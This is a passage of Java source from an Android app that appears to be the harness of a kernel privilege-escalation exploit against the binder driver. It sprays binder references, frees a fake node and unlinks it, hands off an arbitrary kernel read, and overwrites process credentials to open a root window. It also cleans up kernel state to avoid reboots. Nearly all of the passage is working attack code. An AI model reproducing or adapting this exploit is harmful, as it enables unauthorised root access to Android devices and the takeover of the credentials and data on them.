                    if (!isCtlbufDonorFrozenGateValid(donorFrozen)) {
                        writes.append(" donor_freeze=[status=fail]");
                        pass = false;
                        break;
                    }
                    checkpoint("ctlbuf-donor-freeze-pass");
                    continue;
                }
                if (directSecurityRepair && !directCredQuarantine) {
                    String cleanup = NativeBridge.completeTerminalCleanup(
                            getFilesDir().getAbsolutePath());
                    writes.append(" terminal_cleanup=[")
                            .append(cleanup).append("]");
                    checkpoint(cleanup.startsWith(
                                    "status=reboot-required " +
                                    "stage=terminal-cleanup ") &&
                            cleanup.contains("outcome=incomplete") &&
                            cleanup.contains("reboot_required=1")
                            ? "terminal-cleanup-incomplete"
                            : "terminal-cleanup-failed");
                }
                checkpoint("root-window-reboot-required");
                rootWindowReached = true;
                break;
            }
            if (directActionAfterSecuritySwap && !actionCompleted &&
                    directTerminalCleanup && directCredentialWrite &&
                    writeStep == 7) {
                rescuePlanPrepared = prepareTerminalCtlbufRescuePlan(writes);
                if (!rescuePlanPrepared) {
                    pass = false;
                    break;
                }
                checkpoint("root-window-security-ready");
                File actionDone = new File(
                        getFilesDir(), "root-action-security.done");
                waitForEither(actionDone, null, 120000);
                if (!isRootWatchdogArmValid(actionDone)) {
                    writes.append(
                            " security_action=[status=fail reason=binding]");
                    pass = false;
                    break;
                }
                checkpoint("root-window-action-pass");
                actionCompleted = true;
            }
            if (directTerminalCleanup && directCredentialWrite &&
                    actionCompleted && writeStep == 7) {
                if (!rescuePlanPrepared &&
                        !prepareTerminalCtlbufRescuePlan(writes)) {
                    pass = false;
                    break;
                }
                checkpoint("helper-normalisation-arm-ready");
                File normalised = new File(
                        getFilesDir(), "helper-normalised.done");
                waitForEither(normalised, null, 60000);
                if (!isTerminalHostGateValid(normalised, false)) {
                    writes.append(" normalisation_host=[status=fail]");
                    pass = false;
                    break;
                }
                String normalisationHostGate =
                        NativeBridge.acceptTerminalNormalisationHostGate(
                                readSmall(normalised));
                writes.append(" normalisation_host=[")
                        .append(normalisationHostGate).append("]");
                if (!normalisationHostGate.startsWith(
                        "status=pass stage=terminal-normalisation-host-gate")) {
                    pass = false;
                    break;
                }
                File finaliseGate = new File(
                        getFilesDir(), "ctlbuf-finalise.result");
                waitForEither(finaliseGate, null, 60000);
                String finaliseProof = readSmall(finaliseGate);
                String acceptedFinalise =
                        NativeBridge.acceptCtlbufFinaliseProof(finaliseProof);
                writes.append(" finalise_proof=[")
                        .append(acceptedFinalise).append("]");
                if (!acceptedFinalise.startsWith(
                        "status=pass stage=ctlbuf-finalise-proof")) {
                    writes.append(" finalise_host=[status=fail]");
                    pass = false;
                    break;
                }
                String normalisation =
                        NativeBridge.validateTerminalNormalisation();
                writes.append(" normalisation=[")
                        .append(normalisation).append("]");
                if (!normalisation.startsWith("status=pass")) {
                    pass = false;
                    break;
                }
                checkpoint("helper-retirement-arm-ready");
                File retired = new File(
                        getFilesDir(), "helper-retired.done");
                waitForEither(retired, null, 60000);
                if (!isTerminalHostGateValid(retired, true)) {
                    writes.append(" retirement_host=[status=fail]");
                    pass = false;
                    break;
                }
                long deathDeadline = SystemClock.elapsedRealtime() + 5000;
                while (!credentialTargetDeathCallback.get() &&
                        SystemClock.elapsedRealtime() < deathDeadline) {
                    SystemClock.sleep(25);
                }
                String credentialDeath = credentialTargetDeathProof;
                if (!credentialTargetDeathCallback.get() ||
                        !credentialDeath.startsWith(
                                "status=pass stage=credential-target-death ")) {
                    writes.append(" credential_target_death=[status=fail]");
                    pass = false;
                    break;
                }
                writePrivateAtomic("credential-target-death.result",
                        credentialDeath);
                writes.append(" credential_target_death=[")
                        .append(credentialDeath).append("]");
                checkpoint("terminal-donor-retirement-proof-start");
                String donorRetirement =
                        NativeBridge.proveTerminalDonorRetirement();
                writePrivateAtomic(
                        "terminal-donor-retirement.result",
                        donorRetirement);
                writes.append(" donor_retirement=[")
                        .append(donorRetirement).append("]");
                if (!donorRetirement.startsWith("status=pass")) {
                    checkpoint("terminal-donor-retirement-proof-failed");
                    pass = false;
                    break;
                }
                checkpoint("terminal-donor-retirement-proof-pass");
                boolean retirementStarted = false;
                try {
                    requiredCheckpoint("terminal-java-retirement-start");
                    retirementStarted = true;
                    retireTerminalJavaObjectsBounded();
                    requiredCheckpoint("terminal-java-retirement-pass");
                } catch (Exception exception) {
                    if (retirementStarted) {
                        try {
                            requiredCheckpoint("terminal-java-retirement-fail " +
                                    "stage=" + safeCheckpointToken(
                                            terminalJavaRetirementStage) +
                                    " type=" + safeCheckpointToken(
                                            exception.getClass().getSimpleName()) +
                                    " message=" + safeCheckpointToken(
                                            exception.getMessage()));
                        } catch (IOException checkpointException) {
                            exception.addSuppressed(checkpointException);
                        }
                    }
                    throw exception;
                }
                requiredCheckpoint("native-terminal-cleanup-start");
                String cleanup = NativeBridge.completeTerminalCleanup(
                        getFilesDir().getAbsolutePath());
                writes.append(" terminal_cleanup=[")
                        .append(cleanup).append("]");
                boolean clean = cleanup.startsWith(
                        "status=pass stage=terminal-cleanup ") &&
                        cleanup.contains("outcome=clean") &&
                        cleanup.contains("reboot_required=0");
                boolean profileDescriptorsRetired =
                        closeParcelFileDescriptor(ctlbufModuleFd) &
                        closeParcelFileDescriptor(ctlbufVendorFd);
                ctlbufModuleFd = null;
                ctlbufVendorFd = null;
                if (!profileDescriptorsRetired) {
                    writes.append(" ctlbuf_profile_fds=[status=fail]");
                    clean = false;
                }
                checkpoint(clean ? "terminal-cleanup-pass"
                        : "terminal-cleanup-failed");
                pass = clean;
                rootWindowReached = clean;
                break;
            }
            if (!directCredentialWrite &&
                    victim == RAW_VICTIM_COUNT - 1) {
                checkpoint("root-window-restored");
            }
        }
        if (directCredentialWrite && !rootWindowReached) {
            checkpoint("root-write-incomplete");
            pass = false;
        }
        String rootUnlink = "status=" + (pass ? "pass" : "miss") +
                " stage=root-unlink uid_expected=0 handle=[" +
                handleState + "] decrement=[" + decrement +
                "] refs=[" + refs + "] analysis=[" + analysis +
                "] clients=[" + clients +
                "] client_exit=[" + clientExit + "]" + extraExits +
                " cache=[" + victimCaches + "] target_cache=[" +
                credentialTargetState + "] target=[" +
                credentialTarget + "] prepare=[" +
                prepare + "] first=[" + first +
                "] private_credential=[" + privateCredential +
                "] security=[" +
                securityTarget + "] internal_write_misses=" +
                internalWriteMisses + writes;
        return rootUnlink;
    }

    private boolean signalBootCopy() {
        try (Socket socket = new Socket()) {
            socket.connect(new InetSocketAddress(
                    InetAddress.getLoopbackAddress(), COPY_SIGNAL_PORT),
                    1000);
            socket.getOutputStream().write(1);
            socket.getOutputStream().flush();
            return true;
        } catch (IOException exception) {
            return false;
        }
    }

    private String completeIndexedUnlink(int victim, long target)
            throws Exception {
        String suffix = "." + victim;
        File observed = new File(getFilesDir(),
                "controlled-reader.result" + suffix);
        waitForEither(observed, null, 120000);
        String observation = readSmall(observed);
        int worker = parseIntField(observation, "worker_index=");
        if (!observation.startsWith("status=ready") ||
                !observation.contains("exact_payload=1") || worker < 0) {
            boolean processTeardown = victim == 0 &&
                    prepareProcessTeardown(observation);
            boolean safeNoFree =
                    victim != 0 && observation.startsWith(
                            "status=miss stage=fake-node-check") &&
                    observation.contains("exact_payload=0") &&
                    observation.contains("buffer_freed=0");
            return "status=miss stage=unlink-observe safe_no_free=" +
                    (safeNoFree ? 1 : 0) + " teardown_required=" +
                    (processTeardown ? 1 : 0) + " teardown_signal=" +
                    processTeardownSignal + " observation=[" +
                    observation + "]";
        }
        if (victim == 0) {
            kernelMutationStarted = true;
            checkpoint("arbitrary-read-free-start");
            String handoff = NativeBridge.handoffRawArbitraryRead(worker);
            checkpoint(handoff.startsWith("status=pass")
                    ? "arbitrary-read-safe-to-active"
                    : "arbitrary-read-handoff-failed");
            if (!handoff.startsWith("status=pass")) {
                checkpoint("root-window-reboot-required");
                return "status=miss stage=unlink-handoff reboot_required=1"
                        + " state=[" + handoff + "]";
            }
            checkpoint("arbitrary-read-retained");
        }
        boolean quarantineWrite = directCredQuarantine && victim > 0 &&
                target == NativeBridge.rootWriteTarget(5);
        if (quarantineWrite) {
            checkpoint("cred-quarantine-ready");
            checkpoint("root-window-ready");
            File actionDone = new File(getFilesDir(),
                    "root-action.done");
            waitForEither(actionDone, null, 120000);
            if (!actionDone.exists()) {
                checkpoint("root-window-reboot-required");
                return "status=miss stage=cred-quarantine-action";
            }
            checkpoint("root-window-action-pass");
            requiredCheckpoint("cred-quarantine-armed");
        }
        if (victim > 0 && directSecurityRepair) {
            String writeGate = NativeBridge.validateRawWriteGate(
                    target, victim);
            boolean writeGatePass = writeGate.startsWith("status=pass");
            requiredCheckpoint((writeGatePass
                    ? "direct-security-write-gate-pass"
                    : "direct-security-write-gate-fail") +
                    " victim=" + victim + " result=[" + writeGate + "]");
            if (!writeGatePass) {
                checkpoint("root-window-reboot-required");
                return writeGate;
            }
        }
        if (victim == 1) {
            checkpoint("root-mutation-start");
        }
        File progressFile = new File(getFilesDir(), "raw-unlink.progress");
        writePrivate("raw-unlink.progress",
                "stage=java-ready victim=" + victim + " worker=" + worker);
        try (ParcelFileDescriptor progress = ParcelFileDescriptor.open(
                progressFile, ParcelFileDescriptor.MODE_READ_WRITE)) {
            writePrivate("controlled-free.enable" + suffix,
                    "1");
            File freed = new File(getFilesDir(),
                    "controlled-free.result" + suffix);
            waitForEither(freed, null, 120000);
            String free = readSmall(freed);
            if (!free.equals("status=pass stage=fake-node-check " +
                    "buffer_freed=1")) {
                return "status=miss stage=unlink-free result=[" + free + "]";
            }
            if (victim == 0) {
                checkpoint("arbitrary-read-free-pass");
            }
            String completed = NativeBridge.completeRawUnlink(
                    worker, victim, target, progress.getFd());
            if (victim == 0 && !completed.startsWith("status=pass")) {
                checkpoint("root-window-reboot-required");
            }
            return completed;
        }
    }

    private boolean prepareProcessTeardown(String observation)
            throws Exception {
        if (!observation.startsWith(
                "status=miss stage=fake-node-check victim=0 ")) {
            return rejectProcessTeardown("observation-prefix");
        }
        if (parseHexLongField(observation, "buffer=0x") == 0) {
            return rejectProcessTeardown("buffer");
        }
        long pointer = parseHexLongField(observation, "ptr=0x");
        long cookie = parseHexLongField(observation, "cookie=0x");
        boolean originalPair = pointer == rawControlledPointer &&
                cookie == rawControlledCookie && observation.contains(
                        " ptr=0x" + Long.toHexString(rawControlledPointer) +
                                " cookie=0x" +
                                Long.toHexString(rawControlledCookie) + " ");
        boolean zeroPair = pointer == 0 && cookie == 0 &&
                observation.contains(" ptr=0x0 cookie=0x0 ");
        if (!originalPair && !zeroPair) {
            return rejectProcessTeardown("pointer");
        }
        if (!observation.contains(" worker_index=-1 ")) {
            return rejectProcessTeardown("worker");
        }
        if (!observation.contains(" exact_payload=0 buffer_freed=0 ")) {
            return rejectProcessTeardown("payload-state");
        }
        if (!observation.contains(" transactions=1 ")) {
            return rejectProcessTeardown("transaction-count");
        }
        if (!observation.contains(
                " victim_refs_before_transaction=0x0 victim_ref_count=0 ")) {
            return rejectProcessTeardown("victim-refs");
        }
        if (!observation.contains(" last_code=0x" +
                Integer.toHexString(
                        OwnerService.TRANSACTION_CONTROLLED_HOLD) +
                " flags=0x0 data_size=0 offsets_size=0 ")) {
            return rejectProcessTeardown("transaction-shape");
        }
        return requestProcessTeardown();
    }

    private boolean prepareProcessTeardownForPrepareMiss(String prepare)
            throws Exception {
        if (!ActivationProofs.isRecoverableInitialPrepareMiss(prepare)) {
            return rejectProcessTeardown("prepare-proof");
        }
        return requestProcessTeardown();
    }

    private boolean requestProcessTeardown() throws Exception {
        if (!directSecurityRepair) {
            return rejectProcessTeardown("repair-disabled");
        }
        if (!processTeardownSupported) {
            return rejectProcessTeardown("unsupported-action");
        }
        if (processTeardownRequired) {
            return rejectProcessTeardown("already-required");
        }
        File freeGate = new File(
                getFilesDir(), "controlled-free.enable.0");
        if (!freeGate.exists() || !"0".equals(readSmall(freeGate))) {
            return rejectProcessTeardown("free-gate");
        }
        if (new File(getFilesDir(),
                "controlled-free.result.0").exists()) {
            return rejectProcessTeardown("free-result");
        }
        if (!rootWatchdogNonce.matches("[0-9a-f]{32}")) {
            return rejectProcessTeardown("nonce");
        }
        if (rootWatchdogHelperPid <= 0) {
            return rejectProcessTeardown("helper-pid");
        }
        if (!rootWatchdogHelperStart.matches("[1-9][0-9]*")) {
            return rejectProcessTeardown("helper-start");
        }
        if (!rootWatchdogBootId.matches(
                "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-" +
                "[0-9a-f]{4}-[0-9a-f]{12}")) {
            return rejectProcessTeardown("boot-id");
        }
        ProcessIdentity harness = new ProcessIdentity(
                Process.myPid(), ProcessIdentity.currentStartTime());
        ProcessIdentity target = rawTargetProcessIdentity;
        ProcessIdentity client = rawClientProcessIdentity;
        if (harness.startTime <= 0 || target == null || client == null ||
                target.pid <= 0 || target.startTime <= 0 ||
                client.pid <= 0 || client.startTime <= 0) {
            return rejectProcessTeardown("identity-snapshot");
        }
        if (ProcessIdentity.readStartTime(target.pid) != target.startTime) {
            return rejectProcessTeardown("raw-target-dead");
        }
        if (ProcessIdentity.readStartTime(client.pid) != client.startTime) {
            return rejectProcessTeardown("raw-client-dead");
        }
        String token = "version=1 reason=initial-acquisition-miss" +
                " nonce=" + rootWatchdogNonce +
                " boot_id=" + rootWatchdogBootId +
                " helper_pid=" + rootWatchdogHelperPid +
                " helper_start=" + rootWatchdogHelperStart +
                " harness_pid=" + harness.pid +
                " harness_start=" + harness.startTime +
                " raw_target_pid=" + target.pid +
                " raw_target_start=" + target.startTime +
                " raw_client_pid=" + client.pid +
                " raw_client_start=" + client.startTime;
        writePrivateAtomic("proc-teardown.token", token);
        processTeardownSignal = signalProcessTeardownWatchdog();
        processTeardownRequired = "pass".equals(processTeardownSignal);
        return processTeardownRequired;
    }

    private boolean rejectProcessTeardown(String reason) {
        processTeardownSignal = "rejected-" + reason;
        return false;
    }

    private String signalProcessTeardownWatchdog() {
        if (credentialTarget == null) {
            return "no-target";
        }
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeString(rootWatchdogNonce);
            data.writeString(rootWatchdogBootId);
            data.writeInt(rootWatchdogHelperPid);
            data.writeString(rootWatchdogHelperStart);
            if (!credentialTarget.transact(
                    TRANSACTION_PROCESS_TEARDOWN, data, reply, 0)) {
                return "transaction-false";
            }
            reply.readException();
            String state = reply.readString();
            if ("status=pass stage=process-teardown-watchdog".equals(state)) {
                return "pass";
            }
            return state == null ? "reply-null" : "reply-fail";
        } catch (Exception exception) {
            return "exception-" + exception.getClass().getSimpleName();
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    private int parseIntField(String value, String field) {
        int start = value.indexOf(field);
        if (start < 0) {
            return -1;
        }
        start += field.length();
        int end = start;
        while (end < value.length() &&
                Character.isDigit(value.charAt(end))) {
            end++;
        }
        if (end == start) {
            return -1;
        }
        return Integer.parseInt(value.substring(start, end));
    }

    private long parseHexLongField(String value, String field) {
        int start = value.indexOf(field);
        if (start < 0) {
            return 0;
        }
        start += field.length();
        int end = start;
        while (end < value.length() &&
                Character.digit(value.charAt(end), 16) >= 0) {
            end++;
        }
        return end == start ? 0 : Long.parseUnsignedLong(
                value.substring(start, end), 16);
    }

    private long parseLongField(String value, String field) {
        int start = value.indexOf(field);
        if (start < 0) {
            return -1;
        }
        start += field.length();
        int end = start;
        while (end < value.length() &&
                Character.isDigit(value.charAt(end))) {
            end++;
        }
        if (end == start) {
            return -1;
        }
        try {
            return Long.parseLong(value.substring(start, end));
        } catch (NumberFormatException exception) {
            return -1;
        }
    }

    private List<IBinder> bindIsolatedControllers(int requested)
            throws Exception {
        CountDownLatch connected = new CountDownLatch(requested);
        List<IBinder> controllers = new ArrayList<>();
        for (int index = 0; index < requested; index++) {
            ServiceConnection isolated = new ServiceConnection() {
                @Override
                public void onServiceConnected(ComponentName name,
                                               IBinder service) {
                    synchronized (controllers) {
                        controllers.add(service);
                    }
                    connected.countDown();
                }

                @Override
                public void onServiceDisconnected(ComponentName name) {
                }
            };
            boolean bound = bindIsolatedService(
                    new Intent(this, IsolatedRefService.class),
                    Context.BIND_AUTO_CREATE,
                    "nodeaddr" + index + Long.toHexString(System.nanoTime()),
                    getMainExecutor(), isolated);
            if (bound) {
                synchronized (isolatedConnections) {
                    isolatedConnections.add(isolated);
                }
            } else {
                connected.countDown();
            }
        }
        connected.await(60, TimeUnit.SECONDS);
        synchronized (controllers) {
            return new ArrayList<>(controllers);
        }
    }

    private String prepareRawBinderHolders() {
        synchronized (rawBinderHolderEndpoints) {
            if (!rawBinderHolderEndpoints.isEmpty()) {
                return "status=fail stage=raw-binder-holder-bootstrap" +
                        " reason=stale-endpoints count=" +
                        rawBinderHolderEndpoints.size();
            }
            rawBinderHolderEndpoints.addAll(Collections.nCopies(
                    RAW_BINDER_HOLDER_COUNT, null));
        }
        Parcel serviceManager = Parcel.obtain();
        Binder callbackMarker = new Binder();
        Parcel startService = Parcel.obtain();
        String serviceExport = "status=fail stage=parcel-template-export" +
                " reason=not-run";
        String startExport = serviceExport;
        String routes = "status=fail stage=raw-binder-holder-routes" +
                " reason=not-run";
        long started = SystemClock.elapsedRealtimeNanos();
        try {
            serviceManager.writeInterfaceToken("android.os.IServiceManager");
            serviceManager.writeString("activity");
            Intent broker = new Intent(this, HarnessService.class);
            broker.putExtra("stage", "raw-binder-broker");
            broker.putExtra(RAW_BROKER_HOLDER_EXTRA, true);
            broker.putExtra(RAW_BROKER_HOLDER_INDEX_EXTRA,
                    RAW_BROKER_HOLDER_INDEX_SENTINEL);
            android.os.Bundle extras = broker.getExtras();
            if (extras == null) {
                extras = new android.os.Bundle();
            }
            extras.putBinder(RAW_BROKER_CALLBACK_EXTRA, callbackMarker);
            broker.replaceExtras(extras);
            startService.writeInterfaceToken("android.app.IActivityManager");
            startService.writeStrongBinder(null);
            startService.writeTypedObject(broker, 0);
            startService.writeString(null);
            startService.writeBoolean(false);
            startService.writeString(getPackageName());
            startService.writeString(null);
            startService.writeInt(Process.myUid() / 100000);
            File serviceTemplate = new File(getFilesDir(),
                    "raw-route-holder-service.template");
            File startTemplate = new File(getFilesDir(),
                    "raw-route-holder-start.template");
            serviceExport = NativeBridge.exportParcelTemplate(
                    serviceManager, serviceTemplate.getPath());
            startExport = NativeBridge.exportParcelTemplate(
                    startService, startTemplate.getPath());
            if (serviceExport.startsWith("status=pass") &&
                    startExport.startsWith("status=pass")) {
                routes = NativeBridge.startRawBinderHolderRoutes(
                        serviceTemplate.getPath(), startTemplate.getPath(),
                        RAW_BINDER_HOLDER_COUNT,
                        RAW_BROKER_HOLDER_INDEX_SENTINEL);
            }
        } finally {
            startService.recycle();
            serviceManager.recycle();
        }
        int endpoints;
        synchronized (rawBinderHolderEndpoints) {
            endpoints = 0;
            for (RawBinderHolderEndpoint endpoint :
                    rawBinderHolderEndpoints) {
                endpoints += endpoint == null ? 0 : 1;
            }
        }
        boolean pass = endpoints == RAW_BINDER_HOLDER_COUNT &&
                routes.startsWith("status=pass");
        rawBinderHoldersActive = pass;
        if (!pass) {
            synchronized (rawBinderHolderEndpoints) {
                for (RawBinderHolderEndpoint endpoint :
                        rawBinderHolderEndpoints) {
                    if (endpoint != null && endpoint.deathBarrier != 0) {
                        NativeBridge.discardBinderDeathBarrier(
                                endpoint.deathBarrier);
                        endpoint.deathBarrier = 0;
                    }
                }
                rawBinderHolderEndpoints.clear();
            }
            if (routes.startsWith("status=pass")) {
                NativeBridge.releaseRawBinderRouteProbes();
            }
        }
        long durationMicros = (SystemClock.elapsedRealtimeNanos() -
                started) / 1000;
        return "status=" + (pass ? "pass" : "fail") +
                " stage=raw-binder-holder-bootstrap requested=" +
                RAW_BINDER_HOLDER_COUNT + " prepared=" + endpoints +
                " endpoints=" + endpoints + " duration_us=" +
                durationMicros + " routes=[" + routes +
                "] service=[" + serviceExport + "] start=[" +
                startExport + "]";
    }

    private String primeRawBinderHolders() {
        List<RawBinderHolderEndpoint> endpoints;
        synchronized (rawBinderHolderEndpoints) {
            endpoints = new ArrayList<>(rawBinderHolderEndpoints);
        }
        if (!rawBinderHoldersActive || endpoints.size() !=
                RAW_BINDER_HOLDER_COUNT || rawBinderPrimeNodes != null) {
            return "status=fail stage=raw-binder-holder-prime" +
                    " reason=preflight endpoints=" + endpoints.size();
        }
        int totalRefs = RAW_BINDER_HOLDER_COUNT *
                RAW_BINDER_PRIME_REFS_PER_HOLDER;
        IBinder[] primeNodes = new IBinder[totalRefs];
        for (int index = 0; index < primeNodes.length; index++) {
            primeNodes[index] = new Binder();
        }
        rawBinderPrimeNodes = primeNodes;
        int cpu = NativeBridge.pinCurrentThread(2);
        FutureTask<String> receiver = new FutureTask<>(() ->
                NativeBridge.receiveRawBinderHolderRefs(
                        RAW_BINDER_HOLDER_COUNT,
                        RAW_BINDER_PRIME_REFS_PER_HOLDER,
                        RAW_BROKER_PRIME_PROOF, -1));
        Thread receiverThread = new Thread(receiver,
                "raw-binder-prime-receiver");
        receiverThread.start();
        int submitted = 0;
        for (int holder = 0; holder < endpoints.size(); holder++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInt(RAW_BROKER_PRIME_PROOF);
                data.writeInt(RAW_BINDER_PRIME_REFS_PER_HOLDER);
                int first = holder * RAW_BINDER_PRIME_REFS_PER_HOLDER;
                for (int index = 0;
                     index < RAW_BINDER_PRIME_REFS_PER_HOLDER; index++) {
                    data.writeStrongBinder(primeNodes[first + index]);
                }
                if (!endpoints.get(holder).callback.transact(
                        RAW_BROKER_HOLDER_CODE, data, reply, 0)) {
                    break;
                }
                reply.readException();
                if (reply.readInt() != RAW_BROKER_PRIME_PROOF) {
                    break;
                }
                submitted++;
            } catch (RemoteException exception) {
                break;
            } finally {
                reply.recycle();
                data.recycle();
            }
        }
        String received;
        try {
            received = receiver.get(6, TimeUnit.SECONDS);
        } catch (InterruptedException exception) {
            Thread.currentThread().interrupt();
            received = "status=fail stage=raw-binder-holder-refs" +
                    " reason=interrupted";
        } catch (ExecutionException | TimeoutException exception) {
            received = "status=fail stage=raw-binder-holder-refs" +
                    " reason=receiver type=" +
                    exception.getClass().getSimpleName();
        }
        boolean pass = cpu == 2 && submitted == RAW_BINDER_HOLDER_COUNT &&
                received.startsWith("status=pass");
        return "status=" + (pass ? "pass" : "fail") +
                " stage=raw-binder-holder-prime submitted=" + submitted +
                " refs=" + totalRefs + " cpu=" + cpu +
                " received=[" + received + "]";
    }

    private String retainRawBinderHolderRefs() {
        return retainRawBinderHolderRefs(false);
    }

    private String retainRawBinderHolderRefs(boolean compact) {
        List<RawBinderHolderEndpoint> endpoints;
        synchronized (rawBinderHolderEndpoints) {
            endpoints = new ArrayList<>(rawBinderHolderEndpoints);
        }
        if (!rawBinderHoldersActive || endpoints.size() !=
                    RAW_BINDER_HOLDER_COUNT || fillerNodes == null ||
                controlledNode == null) {
            return "status=fail stage=raw-binder-holder-send" +
                    " reason=preflight endpoints=" + endpoints.size();
        }
        int cpu = NativeBridge.pinCurrentThread(2);
        int fixedRefs = compact ? 1 : 0;
        FutureTask<String> receiver = new FutureTask<>(() ->
                NativeBridge.receiveRawBinderHolderRefs(
                        RAW_BINDER_HOLDER_COUNT, fixedRefs,
                        RAW_BROKER_HOLDER_PROOF, -1));
        Thread receiverThread = new Thread(receiver,
                "raw-binder-holder-receiver");
        receiverThread.start();
        int submitted = 0;
        StringBuilder mixedInterleave = new StringBuilder();
        for (int holder = 0; holder < endpoints.size(); holder++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                int rawFillers = compact ? 0 :
                        RAW_BINDER_FILLER_MIN + holder /
                                (RAW_BINDER_HOLDER_COUNT /
                                        RAW_BINDER_FILLER_VARIANTS);
                data.writeInt(RAW_BROKER_HOLDER_PROOF);
                data.writeInt(rawFillers + 1);
                if (compact) {
                    data.writeStrongBinder(controlledNode);
                }
                int first = holder * FILLERS_PER_PROCESS;
                for (int filler = 0; filler < rawFillers; filler++) {
                    data.writeStrongBinder(fillerNodes[
                            (first + filler) % fillerNodes.length]);
                }
                if (!compact) {
                    data.writeStrongBinder(controlledNode);
                }
                if (!endpoints.get(holder).callback.transact(
                        RAW_BROKER_HOLDER_CODE, data, reply, 0)) {
                    break;
                }
                reply.readException();
                if (reply.readInt() != RAW_BROKER_HOLDER_PROOF) {
                    break;
                }
                submitted++;
                String interleave = extendMixedEpitemsForHolderCount(
                        submitted);
                if (!interleave.isEmpty()) {
                    mixedInterleave.append(" [").append(interleave)
                            .append("]");
                    if (!interleave.startsWith("status=pass")) {
                        break;
                    }
                }
            } catch (RemoteException exception) {
                break;
            } finally {
                reply.recycle();
                data.recycle();
            }
        }
        String received;
        try {
            received = receiver.get(6, TimeUnit.SECONDS);
        } catch (InterruptedException exception) {
            Thread.currentThread().interrupt();
            received = "status=fail stage=raw-binder-holder-refs" +
                    " reason=interrupted";
        } catch (ExecutionException | TimeoutException exception) {
            received = "status=fail stage=raw-binder-holder-refs" +
                    " reason=receiver type=" +
                    exception.getClass().getSimpleName();
        }
        boolean pass = cpu == 2 && submitted == RAW_BINDER_HOLDER_COUNT &&
                received.startsWith("status=pass") &&
                mixedInterleave.indexOf("status=fail") < 0;
        return "status=" + (pass ? "pass" : "fail") +
                " stage=raw-binder-ref-spray mode=synchronous" +
                " submitted=" + submitted +
                " filler_range=" + (compact ? "0-0" :
                        RAW_BINDER_FILLER_MIN + "-" +
                                (RAW_BINDER_FILLER_MIN +
                                        RAW_BINDER_FILLER_VARIANTS - 1)) +
                " cpu=" + cpu + " interleave=" + mixedInterleave +
                " received=[" + received + "]";
    }

    private String retainRawRootBinderHolderRefs() {
        return retainRawRootBinderHolderRefs(false);
    }

    private String retainRawRootBinderHolderRefs(boolean compact) {
        List<RawBinderHolderEndpoint> endpoints;
        synchronized (rawBinderHolderEndpoints) {
            endpoints = new ArrayList<>(rawBinderHolderEndpoints);
        }
        Parcel nodeTemplate = rawControlledNodeParcel;
        if (!rawBinderHoldersActive || endpoints.size() !=
                    RAW_BINDER_HOLDER_COUNT ||
                (!compact && fillerNodes == null) ||
                nodeTemplate == null || nodeTemplate.dataSize() <= 0) {
            return "status=fail stage=raw-root-binder-holder-send" +
                    " reason=preflight endpoints=" + endpoints.size();
        }
        int cpu = NativeBridge.pinCurrentThread(2);
        int fixedRefs = compact ? -1 : 0;
        FutureTask<String> receiver = new FutureTask<>(() ->
                NativeBridge.receiveRawBinderHolderRefs(
                        RAW_BINDER_HOLDER_COUNT, fixedRefs,
                        RAW_BROKER_HOLDER_PROOF, compact ? -1 : -2));
        Thread receiverThread = new Thread(receiver,
                "raw-root-binder-holder-receiver");
        receiverThread.start();
        int submitted = 0;
        StringBuilder mixedInterleave = new StringBuilder();
        for (int holder = 0; holder < endpoints.size(); holder++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                int rawFillers = compact ? 0 :
                        RAW_BINDER_FILLER_MIN + holder /
                                (RAW_BINDER_HOLDER_COUNT /
                                        RAW_BINDER_FILLER_VARIANTS);
                data.writeInt(RAW_BROKER_HOLDER_PROOF);
                boolean markerRoute = compact && holder %
                        (RAW_BINDER_HOLDER_COUNT /
                                RAW_CURRENT_PROC_MARKER_HOLDERS) == 0;
                data.writeInt(rawFillers + (compact
                        ? markerRoute ? 2 : 1 : 2));
                if (compact) {
                    data.appendFrom(nodeTemplate, 0,
                            nodeTemplate.dataSize());
                    if (markerRoute) {
                        data.setDataPosition(data.dataSize());
                        data.writeStrongBinder(rawCurrentProcMarker);
                    }
                }
                int first = holder * FILLERS_PER_PROCESS;
                for (int filler = 0; filler < rawFillers; filler++) {
                    data.writeStrongBinder(fillerNodes[
                            (first + filler) % fillerNodes.length]);
                }
                if (!compact) {
                    data.appendFrom(nodeTemplate, 0,
                            nodeTemplate.dataSize());
                }
                if (!compact) {
                    data.writeStrongBinder(kernelAnchor);
                }
                if (!endpoints.get(holder).callback.transact(
                        RAW_BROKER_HOLDER_CODE, data, reply, 0)) {
                    break;
                }
                reply.readException();
                if (reply.readInt() != RAW_BROKER_HOLDER_PROOF) {
                    break;
                }
                submitted++;
                String interleave = extendMixedEpitemsForHolderCount(
                        submitted);
                if (!interleave.isEmpty()) {
                    mixedInterleave.append(" [").append(interleave)
                            .append("]");
                    if (!interleave.startsWith("status=pass")) {
                        break;
                    }
                }
            } catch (RemoteException exception) {
                break;
            } finally {
                reply.recycle();
                data.recycle();
            }
        }
        String received;
        try {
            received = receiver.get(6, TimeUnit.SECONDS);
        } catch (InterruptedException exception) {
            Thread.currentThread().interrupt();
            received = "status=fail stage=raw-binder-holder-refs" +
                    " reason=interrupted";
        } catch (ExecutionException | TimeoutException exception) {
            received = "status=fail stage=raw-binder-holder-refs" +
                    " reason=receiver type=" +
                    exception.getClass().getSimpleName();
        }
        rawControlledNodeParcel = null;
        nodeTemplate.recycle();
        boolean pass = cpu == 2 && submitted == RAW_BINDER_HOLDER_COUNT &&
                received.startsWith("status=pass") &&
                mixedInterleave.indexOf("status=fail") < 0;
        rawCurrentProcMarkerRetained = pass && compact
                ? RAW_CURRENT_PROC_MARKER_HOLDERS : 0;
        kernelAnchorRetained = pass && !compact
                ? RAW_BINDER_HOLDER_COUNT : 0;
        return "status=" + (pass ? "pass" : "fail") +
                " stage=raw-root-binder-ref-spray mode=synchronous" +
                " submitted=" + submitted +
                " filler_range=" + (compact ? "0-0" :
                        RAW_BINDER_FILLER_MIN + "-" +
                                (RAW_BINDER_FILLER_MIN +
                                        RAW_BINDER_FILLER_VARIANTS - 1)) +
                " anchors=" + kernelAnchorRetained +
                " current_proc_markers=" +
                rawCurrentProcMarkerRetained +
                " proxy_materialised=0 template_released=1" +
